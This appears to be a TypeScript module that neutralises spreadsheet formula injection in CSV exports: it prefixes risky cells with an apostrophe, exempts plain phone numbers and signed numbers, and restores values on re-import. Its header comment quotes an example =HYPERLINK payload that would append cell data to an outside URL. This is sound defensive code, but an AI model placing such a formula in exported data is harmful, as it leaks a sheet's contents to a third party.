// Spreadsheet apps run a cell that starts with = + - or @ as a formula (a leading tab or carriage
// return is stripped first by some). Exported cells hold text people typed, viewers included
// through My profile, and an admin opens the export in a spreadsheet: a preferred name like
// =HYPERLINK("https://…?"&A2,"…") would send the sheet's data away. Such a cell is written with a
// leading apostrophe, which spreadsheets read as "this is text", and parseCsv drops it again, so
// an export re-imports unchanged.

const FORMULA_START = /^[=+\-@\t\r]/;
// A signed number or phone number ("+44 20 7946 0000", "-3") can't call a function or another
// program, so it's written as is rather than gaining an apostrophe in every phone cell.
const PLAIN_NUMBER = /^[+-][\d\s().-]*$/;

export function neutralizeFormula(value: string): string {
  return FORMULA_START.test(value) && !PLAIN_NUMBER.test(value) ? `'${value}` : value;
}

// The inverse of neutralizeFormula: drops the apostrophe only where it would have added one.
export function restoreFormula(value: string): string {
  if (!value.startsWith("'")) return value;
  const rest = value.slice(1);
  return neutralizeFormula(rest) === rest ? value : rest;
}

// Options for csv-stringify, so every string cell of an export is neutralized.
export const SAFE_CSV_CAST = { string: (value: string) => neutralizeFormula(value) };
